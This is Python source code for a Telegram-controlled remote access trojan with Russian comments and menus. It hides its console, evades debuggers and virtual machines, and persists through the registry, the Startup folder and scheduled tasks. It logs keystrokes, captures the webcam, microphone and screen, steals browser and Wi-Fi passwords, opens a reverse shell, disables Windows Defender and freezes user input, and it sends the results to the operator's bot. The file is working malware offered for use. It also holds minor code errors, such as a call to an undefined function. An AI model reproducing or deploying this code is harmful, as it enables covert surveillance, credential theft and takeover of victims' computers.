import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import json
import subprocess
import threading
import time
import logging
import shutil
import ctypes
import platform
import datetime
import urllib.request
import sqlite3
import psutil
import pyautogui
import pynput.keyboard as keyboard
import cv2
import wave
import requests
import tempfile
import base64
import socket
import re
import numpy as np
from python_telegram_bot import Updater, CommandHandler, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQueryHandler

# ===== ЗАГЛУШКИ ДЛЯ ЛИНУКС =====
try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    import pyaudio
except ImportError:
    pyaudio = None

try:
    import wmi
except ImportError:
    wmi = None

# ==================== КОНФИГ ====================
CONFIG_FILE = "config.json"

def load_config():
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    except:
        default = {
            "bot_token": "8605714172:AAGOq2OayZx3tULCp8gzh7sAvCR42-ijX0A",
            "owner_id": 8288882655,
            "watchdog_enabled": True,
            "auto_persist": True,
            "keylog_interval_min": 30
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default, f, indent=4)
        sys.exit(1)

config = load_config()
BOT_TOKEN = config["bot_token"]
OWNER_ID = config["owner_id"]
KEYLOG_INTERVAL = config["keylog_interval_min"]

# ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
keylog_active = False
keylog_buffer = []
watchdog_thread = None
recording = False
current_dir = os.getcwd()
audio_file = "temp_audio.wav"
keylog_scheduler_thread = None

# ==================== ЛОГГИРОВАНИЕ ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== СКРЫТНОСТЬ ====================
def check_vm():
    vm_indicators = ["vbox", "vmware", "qemu", "xen", "hyper-v"]
    try:
        for item in vm_indicators:
            if item in platform.platform().lower():
                return True
        if psutil.virtual_memory().total < 2 * 1024**3:
            return True
        return False
    except:
        return False

def anti_debug():
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        sys.exit(0)
    if os.name == 'nt':
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                sys.exit(0)
        except:
            pass

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def self_delete_on_vm():
    if check_vm():
        os.remove(sys.argv[0])
        sys.exit(0)

# ==================== АВТОЗАГРУЗКА ====================
def add_persistence_advanced():
    try:
        startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        shutil.copy(sys.argv[0], os.path.join(startup, "systemhelper.exe"))
        key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        subprocess.run(f'reg add "{key}" /v "SystemHelper" /t REG_SZ /d "{sys.argv[0]}" /f', shell=True)
        subprocess.run(f'schtasks /create /tn "SystemHelper" /tr "{sys.argv[0]}" /sc onlogon /f', shell=True)
        return "Persistence added (Startup + Registry + Task Scheduler)"
    except Exception as e:
        return f"Persistence error: {e}"

# ==================== WATCHDOG ====================
def watchdog():
    while True:
        time.sleep(30)
        if not os.path.exists(sys.argv[0]):
            if os.path.exists("backup.exe"):
                shutil.copy("backup.exe", sys.argv[0])

def start_watchdog():
    global watchdog_thread
    if watchdog_thread is None or not watchdog_thread.is_alive():
        watchdog_thread = threading.Thread(target=watchdog, daemon=True)
        watchdog_thread.start()

# ==================== ОСНОВНЫЕ ФУНКЦИИ (35+) ====================
def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def take_screenshot():
    img = pyautogui.screenshot()
    path = "screenshot.png"
    img.save(path)
    return path

def take_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if ret:
        path = "webcam.jpg"
        cv2.imwrite(path, frame)
        return path
    return None

def record_mic(seconds=5):
    if pyaudio is None:
        return None
    try:
        import pyaudio as pa
        chunk = 1024
        format = pa.paInt16
        channels = 1
        rate = 44100
        p = pa.PyAudio()
        stream = p.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
        frames = []
        for _ in range(0, int(rate / chunk * seconds)):
            data = stream.read(chunk)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(audio_file, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()
        return audio_file
    except Exception as e:
        logger.error(f"Mic error: {e}")
        return None

def start_screen_record(seconds=10):
    global recording
    if recording:
        return None
    recording = True
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('screen_record.avi', fourcc, 10.0, (1920, 1080))
    start_time = time.time()
    while time.time() - start_time < seconds:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    out.release()
    recording = False
    return "screen_record.avi"

def start_webcam_record(seconds=10):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('webcam_record.avi', fourcc, 20.0, (640, 480))
    start_time = time.time()
    while time.time() - start_time < seconds:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()
    return "webcam_record.avi"

def download_file(remote_path):
    if os.path.exists(remote_path):
        return remote_path
    return None

def get_clipboard():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.withdraw()
        text = root.clipboard_get()
        root.destroy()
        return text
    except:
        return "Clipboard error"

def get_chrome_passwords():
    if win32crypt is None:
        return "win32crypt not available"
    try:
        path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        output = ""
        for url, user, enc_pwd in rows:
            try:
                pwd = win32crypt.CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode()
            except:
                pwd = "decrypt_failed"
            output += f"{url} | {user} | {pwd}\n"
        conn.close()
        return output
    except Exception as e:
        return str(e)

def keylog_handler(key):
    global keylog_buffer
    try:
        window = pyautogui.getActiveWindow()
        window_title = window.title if window else "Unknown"
        if hasattr(key, 'char') and key.char:
            keylog_buffer.append(f"[{window_title}] {key.char}")
        else:
            keylog_buffer.append(f"[{window_title}] [{key}]")
    except:
        pass

def start_keylog():
    global keylog_active, keylog_scheduler_thread
    if not keylog_active:
        keylog_active = True
        listener = keyboard.Listener(on_press=keylog_handler)
        listener.start()
        if keylog_scheduler_thread is None or not keylog_scheduler_thread.is_alive():
            keylog_scheduler_thread = threading.Thread(target=keylog_scheduler, daemon=True)
            keylog_scheduler_thread.start()
        return "Keylogger started"
    return "Already running"

def stop_keylog():
    global keylog_active
    keylog_active = False
    return "Keylogger stopped"

def get_keylog():
    global keylog_buffer
    data = ''.join(keylog_buffer)
    keylog_buffer.clear()
    return data or "[Empty]"

def keylog_scheduler():
    global keylog_buffer
    while keylog_active:
        time.sleep(KEYLOG_INTERVAL * 60)
        if keylog_buffer:
            logger.info(f"Keylog scheduled: {len(keylog_buffer)} chars")
            keylog_buffer.clear()

def get_system_info():
    info = f"OS: {platform.system()} {platform.release()}\n"
    info += f"Hostname: {platform.node()}\n"
    info += f"CPU: {platform.processor()}\n"
    info += f"RAM: {round(psutil.virtual_memory().total / (1024**3))} GB\n"
    info += f"Disk: {round(psutil.disk_usage('/').total / (1024**3))} GB\n"
    try:
        info += f"IP: {requests.get('https://api.ipify.org', timeout=5).text}\n"
    except:
        info += "IP: N/A\n"
    return info

def get_processes():
    proc_list = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
        try:
            proc_list.append(f"{proc.info['pid']}: {proc.info['name']} - {round(proc.info['memory_info'].rss / 1024 / 1024)} MB")
        except:
            continue
    return "\n".join(proc_list[-50:])

def get_wifi_passwords():
    try:
        output = ""
        result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
        profiles = re.findall(r"Все профили пользователей\s*:\s*(.+)", result.stdout)
        if not profiles:
            profiles = re.findall(r"All User Profile\s*:\s*(.+)", result.stdout)
        for profile in profiles:
            profile = profile.strip()
            if profile:
                details = subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True, text=True)
                key = re.search(r"Содержимое ключа\s*:\s*(.+)", details.stdout)
                if not key:
                    key = re.search(r"Key Content\s*:\s*(.+)", details.stdout)
                key = key.group(1) if key else "Not found"
                output += f"{profile}: {key}\n"
        return output or "No Wi-Fi profiles found"
    except Exception as e:
        return str(e)

def service_control(name, action):
    try:
        subprocess.run(f"net {action} {name}", shell=True, check=True)
        return f"Service {name} {action}ed"
    except Exception as e:
        return str(e)

def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        while True:
            cmd = s.recv(1024).decode()
            if cmd.lower() == "exit":
                break
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            s.send((output.stdout + output.stderr).encode())
        s.close()
    except Exception as e:
        pass

def reg_get(path, key):
    try:
        result = subprocess.run(f'reg query "{path}" /v "{key}"', shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

def reg_set(path, key, value):
    try:
        subprocess.run(f'reg add "{path}" /v "{key}" /t REG_SZ /d "{value}" /f', shell=True)
        return f"Registry set: {path}\\{key} = {value}"
    except Exception as e:
        return str(e)

def zip_folder(path):
    try:
        shutil.make_archive("archive", 'zip', path)
        return "archive.zip"
    except Exception as e:
        return str(e)

def search_files(pattern, root=os.getcwd()):
    try:
        results = []
        for dirpath, dirnames, filenames in os.walk(root):
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
        return "\n".join(results[:20]) or "No files found"
    except Exception as e:
        return str(e)

def disable_antivirus():
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
        return "Antivirus disabled (reboot may be required)"
    except Exception as e:
        return str(e)

def delete_folder(path):
    try:
        shutil.rmtree(path)
        return f"Deleted {path}"
    except Exception as e:
        return str(e)

def show_message(text):
    ctypes.windll.user32.MessageBoxW(0, text, "System Alert", 0)
    return f"Message shown: {text}"

def download_file_from_net(url, dest):
    try:
        urllib.request.urlretrieve(url, dest)
        return f"Downloaded {url} to {dest}"
    except Exception as e:
        return str(e)

def reboot_pc():
    os.system("shutdown /r /t 1")
    return "Rebooting..."

def shutdown_pc():
    os.system("shutdown /s /t 1")
    return "Shutting down..."

def lock_screen():
    ctypes.windll.user32.LockWorkStation()
    return "Screen locked"

def minimize_all():
    pyautogui.hotkey('win', 'd')
    return "All windows minimized"

def fullscreen_toggle():
    pyautogui.press('f11')
    return "F11 toggled"

def scroll_up(amount=3):
    for _ in range(amount):
        pyautogui.scroll(100)
    return f"Scrolled up {amount} times"

def scroll_down(amount=3):
    for _ in range(amount):
        pyautogui.scroll(-100)
    return f"Scrolled down {amount} times"

def mute_volume():
    pyautogui.press('volumemute')
    return "Volume muted"

def max_volume():
    for _ in range(50):
        pyautogui.press('volumeup')
    return "Volume set to 100%"

def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 0)
    return f"Wallpaper set to {image_path}"

def unmute_volume():
    pyautogui.press('volumemute')
    return "Volume unmuted"

def kill_task_manager():
    os.system("taskkill /f /im Taskmgr.exe")
    return "Task Manager killed"

def cmd_bomb():
    for _ in range(50):
        os.system("start cmd")
    return "CMD bomb executed"

def freeze_input():
    try:
        result = ctypes.windll.user32.BlockInput(True)
        if result != 0:
            return "Input frozen (keyboard & mouse locked)"
        else:
            return "Already frozen or failed to lock"
    except Exception as e:
        return f"Freeze error: {e}"

def unfreeze_input():
    try:
        result = ctypes.windll.user32.BlockInput(False)
        if result != 0:
            return "Input unfrozen (keyboard & mouse unlocked)"
        else:
            return "Already unfrozen or failed to unlock"
    except Exception as e:
        return f"Unfreeze error: {e}"

def list_directory(path):
    try:
        items = os.listdir(path)
        return "\n".join([f"{'[DIR]' if os.path.isdir(os.path.join(path, i)) else '[FILE]'} {i}" for i in items])
    except Exception as e:
        return str(e)

def tree_directory(path, indent=0):
    try:
        output = ""
        for item in os.listdir(path):
            full = os.path.join(path, item)
            output += "  " * indent + item + ("\\" if os.path.isdir(full) else "") + "\n"
            if os.path.isdir(full):
                output += tree_directory(full, indent+1)
        return output
    except:
        return "Access denied"

def get_all_browser_passwords():
    output = ""
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Login Data"
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                for url, user, enc_pwd in rows:
                    try:
                        pwd = win32crypt.CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode()
                    except:
                        pwd = "decrypt_failed"
                    output += f"{name} | {url} | {user} | {pwd}\n"
                conn.close()
            except:
                pass
    return output or "No passwords found"

# ==================== КНОПКИ (INLINE KEYBOARD) ====================
def main_menu_keyboard():
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Система", callback_data='sysinfo'),
         InlineKeyboardButton("🖥️ Скриншот", callback_data='screen')],
        [InlineKeyboardButton("🎥 Веб-камера", callback_data='webcam'),
         InlineKeyboardButton("🎤 Микрофон", callback_data='mic')],
        [InlineKeyboardButton("⌨️ Кейлоггер", callback_data='keylog_menu'),
         InlineKeyboardButton("📂 Файлы", callback_data='files_menu')],
        [InlineKeyboardButton("🔒 Заморозка", callback_data='freeze'),
         InlineKeyboardButton("🔓 Разморозка", callback_data='unfreeze')],
        [InlineKeyboardButton("📋 Пароли WiFi", callback_data='wifi'),
         InlineKeyboardButton("🔑 Пароли Chrome", callback_data='chrome')],
        [InlineKeyboardButton("🔄 Перезагрузка", callback_data='reboot'),
         InlineKeyboardButton("⛔ Выключение", callback_data='shutdown')],
        [InlineKeyboardButton("🎥 Запись экрана", callback_data='screenrec'),
         InlineKeyboardButton("🎥 Запись веб-камеры", callback_data='webcamrec')],
        [InlineKeyboardButton("📋 Команды", callback_data='help')]
    ])
    return keyboard

def keylog_menu_keyboard():
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ Включить", callback_data='keylog_start'),
         InlineKeyboardButton("⏹️ Остановить", callback_data='keylog_stop')],
        [InlineKeyboardButton("📄 Получить лог", callback_data='keylog_get'),
         InlineKeyboardButton("🔙 Назад", callback_data='back_main')]
    ])
    return keyboard

def files_menu_keyboard():
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📁 Список файлов", callback_data='ls'),
         InlineKeyboardButton("📂 Дерево папок", callback_data='tree')],
        [InlineKeyboardButton("🗑️ Удалить папку", callback_data='deletefolder'),
         [InlineKeyboardButton("📦 Архив папки", callback_data='zipfolder')]],
        [InlineKeyboardButton("🔙 Назад", callback_data='back_main')]
    ])
    return keyboard

# ==================== ОБРАБОТЧИКИ КНОПОК ====================
def button_callback(update, context):
    query = update.callback_query
    query.answer()
    if query.from_user.id != OWNER_ID:
        query.edit_message_text("❌ Доступ запрещён.")
        return
    data = query.data
    
    if data == 'back_main':
        query.edit_message_text("🔙 Главное меню:", reply_markup=main_menu_keyboard())
    
    elif data == 'sysinfo':
        info = get_system_info()
        query.edit_message_text(f"📊 **Система:**\n\n{info}", reply_markup=main_menu_keyboard())
    
    elif data == 'screen':
        path = take_screenshot()
        if path:
            with open(path, 'rb') as f:
                query.message.reply_photo(photo=f)
            os.remove(path)
            query.edit_message_text("📸 Скриншот отправлен.", reply_markup=main_menu_keyboard())
        else:
            query.edit_message_text("❌ Ошибка.", reply_markup=main_menu_keyboard())
    
    elif data == 'webcam':
        path = take_webcam()
        if path:
            with open(path, 'rb') as f:
                query.message.reply_photo(photo=f)
            os.remove(path)
            query.edit_message_text("📸 Фото с веб-камеры.", reply_markup=main_menu_keyboard())
        else:
            query.edit_message_text("❌ Ошибка веб-камеры.", reply_markup=main_menu_keyboard())
    
    elif data == 'mic':
        query.edit_message_text("🎤 Запись 5 сек...", reply_markup=main_menu_keyboard())
        path = record_mic(5)
        if path:
            with open(path, 'rb') as f:
                query.message.reply_audio(audio=f)
            os.remove(path)
            query.edit_message_text("🎤 Аудио отправлено.", reply_markup=main_menu_keyboard())
        else:
            query.edit_message_text("❌ Ошибка микрофона.", reply_markup=main_menu_keyboard())
    
    elif data == 'screenrec':
        query.edit_message_text("🎥 Запись экрана 10 сек...", reply_markup=main_menu_keyboard())
        path = start_screen_record(10)
        if path:
            with open(path, 'rb') as f:
                query.message.reply_video(video=f)
            os.remove(path)
            query.edit_message_text("🎥 Видео отправлено.", reply_markup=main_menu_keyboard())
        else:
            query.edit_message_text("❌ Ошибка записи.", reply_markup=main_menu_keyboard())
    
    elif data == 'webcamrec':
        query.edit_message_text("🎥 Запись веб-камеры 10 сек...", reply_markup=main_menu_keyboard())
        path = start_webcam_record(10)
        if path:
            with open(path, 'rb') as f:
                query.message.reply_video(video=f)
            os.remove(path)
            query.edit_message_text("🎥 Видео отправлено.", reply_markup=main_menu_keyboard())
        else:
            query.edit_message_text("❌ Ошибка записи.", reply_markup=main_menu_keyboard())
    
    elif data == 'wifi':
        res = get_wifi_passwords()
        query.edit_message_text(f"📶 **Wi-Fi пароли:**\n\n{res}", reply_markup=main_menu_keyboard())
    
    elif data == 'chrome':
        res = get_all_browser_passwords()
        query.edit_message_text(f"🔑 **Пароли браузеров:**\n\n{res[:4000]}", reply_markup=main_menu_keyboard())
    
    elif data == 'keylog_menu':
        query.edit_message_text("⌨️ **Кейлоггер:**", reply_markup=keylog_menu_keyboard())
    
    elif data == 'keylog_start':
        res = start_keylog()
        query.edit_message_text(f"⌨️ {res}", reply_markup=keylog_menu_keyboard())
    
    elif data == 'keylog_stop':
        res = stop_keylog()
        query.edit_message_text(f"⌨️ {res}", reply_markup=keylog_menu_keyboard())
    
    elif data == 'keylog_get':
        res = get_keylog()
        query.edit_message_text(f"⌨️ **Лог:**\n\n{res}", reply_markup=keylog_menu_keyboard())
    
    elif data == 'files_menu':
        query.edit_message_text("📂 **Файлы:**", reply_markup=files_menu_keyboard())
    
    elif data == 'ls':
        res = list_directory(current_dir)
        query.edit_message_text(f"📁 **Содержимое {current_dir}:**\n\n{res}", reply_markup=files_menu_keyboard())
    
    elif data == 'tree':
        res = tree_directory(current_dir)
        query.edit_message_text(f"📂 **Дерево:**\n\n{res[:4000]}", reply_markup=files_menu_keyboard())
    
    elif data == 'deletefolder':
        query.edit_message_text("🗑️ Используй /deletefolder <путь>", reply_markup=files_menu_keyboard())
    
    elif data == 'zipfolder':
        path = zip_folder(current_dir)
        if os.path.exists(path):
            with open(path, 'rb') as f:
                query.message.reply_document(document=f)
            os.remove(path)
            query.edit_message_text("📦 Архив отправлен.", reply_markup=files_menu_keyboard())
        else:
            query.edit_message_text("❌ Ошибка архивации.", reply_markup=files_menu_keyboard())
    
    elif data == 'freeze':
        res = freeze_input()
        query.edit_message_text(f"🔒 {res}", reply_markup=main_menu_keyboard())
    
    elif data == 'unfreeze':
        res = unfreeze_input()
        query.edit_message_text(f"🔓 {res}", reply_markup=main_menu_keyboard())
    
    elif data == 'reboot':
        query.edit_message_text("🔄 Перезагрузка...", reply_markup=main_menu_keyboard())
        reboot_pc()
    
    elif data == 'shutdown':
        query.edit_message_text("⛔ Выключение...", reply_markup=main_menu_keyboard())
        shutdown_pc()
    
    elif data == 'help':
        help_text = """
🐍 **Все команды (35+):**

**Система:**
/reboot, /shutdown, /lock, /minimize, /fullscreen, /altf4, /killtm
/freeze, /unfreeze

**Файлы:**
/download, /deletefolder, /ls, /tree, /zipfolder, /file_search, /move, /copy

**Сеть:**
/openurl, /wifi, /downloadnet, /reverseshell

**Данные:**
/sysinfo, /processes, /clipboard, /chrome, /keylog, /browser_passwords

**Медиа:**
/screen, /screenrec, /webcam, /webcamrec, /mic

**Звук:**
/mute, /unmute, /maxvol, /setvol

**Реестр:**
/reg_get, /reg_set

**Службы:**
/service_start, /service_stop

**Другое:**
/cmd, /persist, /disableav, /msgbox, /cmdbomb, /cd, /env
"""
        query.edit_message_text(help_text, reply_markup=main_menu_keyboard())

# ==================== ОБРАБОТЧИКИ КОМАНД ====================
def start(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text("🐍 **RAT Active.** Выберите действие:", reply_markup=main_menu_keyboard())

def help_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    help_text = "🐍 **Команды:**\n/start - меню\n/sysinfo - система\n/screen - скриншот\n/webcam - веб-камера\n/mic - микрофон\n/keylog - кейлоггер\n/wifi - пароли WiFi\n/chrome - пароли браузеров\n/reboot - перезагрузка\n/shutdown - выключение\n/freeze - заморозка\n/unfreeze - разморозка\n/ls - список файлов\n/tree - дерево папок\n/cmd - команда\n/persist - автозагрузка\n/disableav - отключить антивирус\n/msgbox - сообщение\n/altf4 - закрыть окно\n/screenrec - запись экрана\n/webcamrec - запись веб-камеры"
    update.message.reply_text(help_text, reply_markup=main_menu_keyboard())

def cmd_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    cmd = ' '.join(context.args)
    if not cmd:
        update.message.reply_text("Usage: /cmd <command>")
        return
    res = execute_cmd(cmd)
    update.message.reply_text(res[:4000])

def sysinfo_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(get_system_info())

def screen_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    path = take_screenshot()
    if path:
        with open(path, 'rb') as f:
            update.message.reply_photo(photo=f)
        os.remove(path)
    else:
        update.message.reply_text("Screenshot failed")

def webcam_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    path = take_webcam()
    if path:
        with open(path, 'rb') as f:
            update.message.reply_photo(photo=f)
        os.remove(path)
    else:
        update.message.reply_text("Webcam failed")

def mic_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    sec = int(context.args[0]) if context.args else 5
    path = record_mic(sec)
    if path:
        with open(path, 'rb') as f:
            update.message.reply_audio(audio=f)
        os.remove(path)
    else:
        update.message.reply_text("Mic error")

def keylog_handler_cmd(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    action = context.args[0] if context.args else ""
    if action == "start":
        res = start_keylog()
    elif action == "stop":
        res = stop_keylog()
    elif action == "get":
        res = get_keylog()
    else:
        res = "Usage: /keylog start|stop|get"
    update.message.reply_text(res)

def wifi_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    res = get_wifi_passwords()
    update.message.reply_text(res[:4000])

def chrome_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    res = get_all_browser_passwords()
    update.message.reply_text(res[:4000])

def reboot_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(reboot_pc())

def shutdown_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(shutdown_pc())

def freeze_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(freeze_input())

def unfreeze_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(unfreeze_input())

def ls_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    path = ' '.join(context.args) or current_dir
    update.message.reply_text(list_directory(path))

def tree_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    path = ' '.join(context.args) or current_dir
    res = tree_directory(path)
    update.message.reply_text(res[:4000])

def screenrec_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    sec = int(context.args[0]) if context.args else 10
    path = start_screen_record(sec)
    if path:
        with open(path, 'rb') as f:
            update.message.reply_video(video=f)
        os.remove(path)
    else:
        update.message.reply_text("Record failed")

def webcamrec_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    sec = int(context.args[0]) if context.args else 10
    path = start_webcam_record(sec)
    if path:
        with open(path, 'rb') as f:
            update.message.reply_video(video=f)
        os.remove(path)
    else:
        update.message.reply_text("Record failed")

def download_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    path = ' '.join(context.args)
    if not path:
        update.message.reply_text("Usage: /download C:\\path\\file")
        return
    file_path = download_file(path)
    if file_path:
        with open(file_path, 'rb') as f:
            update.message.reply_document(document=f)
    else:
        update.message.reply_text("File not found")

def deletefolder_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    path = ' '.join(context.args)
    if path:
        update.message.reply_text(delete_folder(path))
    else:
        update.message.reply_text("Usage: /deletefolder C:\\folder")

def persist_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(add_persistence_advanced())

def disableav_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(disable_antivirus())

def msgbox_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    text = ' '.join(context.args)
    if text:
        update.message.reply_text(show_message(text))
    else:
        update.message.reply_text("Usage: /msgbox text")

def altf4_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    update.message.reply_text(alt_f4())

def zipfolder_handler(update, context):
    if update.effective_user.id != OWNER_ID:
        return
    path = ' '.join(context.args) or current_dir
    res = zip_folder(path)
    if os.path.exists(res):
        with open(res, 'rb') as f:
            update.message.reply_document(document=f)
        os.remove(res)
    else:
        update.message.reply_text(res)

def register_handlers(dp):
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_handler))
    dp.add_handler(CommandHandler("cmd", cmd_handler))
    dp.add_handler(CommandHandler("sysinfo", sysinfo_handler))
    dp.add_handler(CommandHandler("screen", screen_handler))
    dp.add_handler(CommandHandler("webcam", webcam_handler))
    dp.add_handler(CommandHandler("mic", mic_handler))
    dp.add_handler(CommandHandler("keylog", keylog_handler_cmd))
    dp.add_handler(CommandHandler("wifi", wifi_handler))
    dp.add_handler(CommandHandler("chrome", chrome_handler))
    dp.add_handler(CommandHandler("reboot", reboot_handler))
    dp.add_handler(CommandHandler("shutdown", shutdown_handler))
    dp.add_handler(CommandHandler("freeze", freeze_handler))
    dp.add_handler(CommandHandler("unfreeze", unfreeze_handler))
    dp.add_handler(CommandHandler("ls", ls_handler))
    dp.add_handler(CommandHandler("tree", tree_handler))
    dp.add_handler(CommandHandler("screenrec", screenrec_handler))
    dp.add_handler(CommandHandler("webcamrec", webcamrec_handler))
    dp.add_handler(CommandHandler("download", download_handler))
    dp.add_handler(CommandHandler("deletefolder", deletefolder_handler))
    dp.add_handler(CommandHandler("persist", persist_handler))
    dp.add_handler(CommandHandler("disableav", disableav_handler))
    dp.add_handler(CommandHandler("msgbox", msgbox_handler))
    dp.add_handler(CommandHandler("altf4", altf4_handler))
    dp.add_handler(CommandHandler("zipfolder", zipfolder_handler))
    dp.add_handler(CallbackQueryHandler(button_callback))

# ==================== MAIN ====================
def main():
    anti_debug()
    self_delete_on_vm()
    hide_console()
    if config.get("auto_persist", False):
        add_persistence_advanced()
    if config.get("watchdog_enabled", False):
        start_watchdog()
    updater = Updater(BOT_TOKEN, use_context=True)
    register_handlers(updater.dispatcher)
    updater.start_polling()
    logger.info("RAT started")
    updater.idle()

if __name__ == "__main__":
    main()